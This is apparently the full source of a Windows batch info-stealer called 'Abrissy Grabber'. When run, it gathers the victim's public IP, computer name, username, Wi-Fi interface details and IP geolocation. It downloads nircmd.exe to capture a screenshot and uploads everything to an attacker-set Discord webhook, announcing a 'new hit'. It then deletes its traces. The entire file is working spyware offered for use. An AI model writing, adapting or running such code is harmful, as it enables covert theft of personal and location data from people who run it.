:: RmVtYm95cyBsb3ZlIEFicmlzc3kKQWJyaXNzeSBsb3ZlIGZlbWJveXM=
:: https://github.com/Abrissy/AbrissyGrabber
@echo off 
chcp 65001
::SET WEBHOOK BELOW
::SET WEBHOOK BELOW
::SET WEBHOOK BELOW
set webhook=WEBHOOK_URL



set "api_url=https://api.ipify.org/"
for /f "delims=" %%i in ('curl %api_url%') do set "ip=%%i"
for /f "delims=" %%i in ('hostname') do set "pc_name=%%i"
netsh wlan show interfaces > wifi_info.txt
curl ipinfo.io/%ip%?token=7ac6b2bcbf4dae > ip_info.txt
set "json_content=@payload.json"
curl -OJL "https://github.com/Abrissyy/Abrissy-Grabber/raw/main/Server/nircmd.exe"
nircmd.exe cmdwait 200 savescreenshot "shot.png"
set attachment
(

echo {
echo   "content": "@everyone Abrissy Grabber detect new hit!",
echo   "embeds": [
echo     {
echo       "title": "Informations",
echo       "description": "**IP Adress:**\n*```%ip%```* \n**PC Name:**\n *```%pc_name%```*\n**PC Username:**\n*```%username%```*\n**Discord Token:**\n*```This grabber dont steal token. i will add this option soon```*",
echo       "color": 14587632,
echo       "footer": {
echo         "text": "https://github.com/Abrissyy",
echo         "icon_url": "https://media.discordapp.net/attachments/1178476638091092119/1198343624480538715/download.webp?ex=65be8f78&is=65ac1a78&hm=d63304173c89b6465369e3e56cdfa09ad0bc22b0e757004840089fa71d45582e&=&format=webp&width=176&height=176"
echo       }
echo     }
echo   ],
echo   "username": "Abrissyy Grabber",
echo   "avatar_url": "https://media.discordapp.net/attachments/1178476638091092119/1198343624480538715/download.webp?ex=65be8f78&is=65ac1a78&hm=d63304173c89b6465369e3e56cdfa09ad0bc22b0e757004840089fa71d45582e&=&format=webp&width=176&height=176",
echo   "attachments": []
echo }

) > payload.json
curl -X POST -H "Content-Type: application/json" -d @payload.json %webhook%
curl -X POST -H "Content-Type: multipart/form-data" -F "file=@shot.png" -F "file2=@wifi_info.txt" -F "file3=@ip_info.txt" %webhook%


del nircmd.exe 
del shot.png 
del ip_info.txt 
del wifi_info.txt 
del payload.json 
exit 


